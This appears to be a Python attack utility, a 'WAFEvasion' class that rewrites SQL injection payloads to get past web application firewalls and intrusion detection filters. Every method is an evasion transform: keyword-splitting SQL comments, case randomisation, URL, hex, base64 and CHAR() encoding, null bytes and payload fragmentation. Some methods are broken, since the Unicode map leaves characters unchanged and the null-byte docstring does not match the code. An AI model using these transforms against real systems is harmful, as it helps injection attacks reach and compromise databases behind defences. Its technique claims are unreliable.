#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF/IDS Evasion Techniques
"""

import random
import urllib.parse
import base64

class WAFEvasion:
    def __init__(self):
        self.techniques = {
            'case_randomization': self.case_randomize,
            'comment_insertion': self.insert_comments,
            'encoding': self.encode_payload,
            'fragmentation': self.fragment_payload,
            'null_byte': self.null_byte_bypass,
            'unicode': self.unicode_bypass,
            'hex_encoding': self.hex_encode,
            'char_concat': self.char_concatenation,
        }
    
    def case_randomize(self, payload):
        """Randomize case to bypass case-sensitive filters"""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
    
    def insert_comments(self, payload):
        """Insert SQL comments to break signatures"""
        replacements = {
            'SELECT': 'SEL/**/ECT',
            'UNION': 'UNI/**/ON',
            'INSERT': 'INS/**/ERT',
            'DELETE': 'DEL/**/ETE',
            'UPDATE': 'UPD/**/ATE',
            'DROP': 'DR/**/OP',
            'WHERE': 'WHE/**/RE',
            'FROM': 'FR/**/OM',
            'AND': 'A/**/ND',
            'OR': 'O/**/R',
        }
        
        result = payload
        for orig, repl in replacements.items():
            result = result.replace(orig, repl)
            result = result.replace(orig.lower(), repl)
            result = result.replace(orig.upper(), repl)
        
        return result
    
    def encode_payload(self, payload):
        """URL encode the payload"""
        return urllib.parse.quote(payload, safe='')
    
    def double_encode(self, payload):
        """Double URL encode"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
    
    def fragment_payload(self, payload):
        """Split payload across multiple parameters"""
        mid = len(payload) // 2
        return (payload[:mid], payload[mid:])
    
    def null_byte_bypass(self, payload):
        """Insert null bytes to bypass extension checks"""
        return payload.replace(' ', '%00')
    
    def unicode_bypass(self, payload):
        """Use Unicode normalization"""
        unicode_map = {
            'S': '\u0053', 'E': '\u0045', 'L': '\u004C',
            'U': '\u0055', 'N': '\u004E', 'I': '\u0049',
            'O': '\u004F', 'R': '\u0052',
        }
        return ''.join(unicode_map.get(c, c) for c in payload)
    
    def hex_encode(self, payload):
        """Hex encode strings in payload"""
        import re
        def replace_string(match):
            s = match.group(1)
            return f"0x{s.encode().hex()}"
        return re.sub(r"'([^']*)'", replace_string, payload)
    
    def char_concatenation(self, payload):
        """Use CHAR() function to bypass string filters"""
        import re
        def replace_string(match):
            s = match.group(1)
            chars = ','.join(str(ord(c)) for c in s)
            return f"CHAR({chars})"
        return re.sub(r"'([^']*)'", replace_string, payload)
    
    def base64_bypass(self, payload):
        """Base64 encode payload"""
        return base64.b64encode(payload.encode()).decode()
    
    def apply_all(self, payload):
        """Apply all evasion techniques and return list"""
        results = []
        for name, func in self.techniques.items():
            try:
                result = func(payload)
                if result != payload:
                    results.append((name, result))
            except:
                continue
        return results
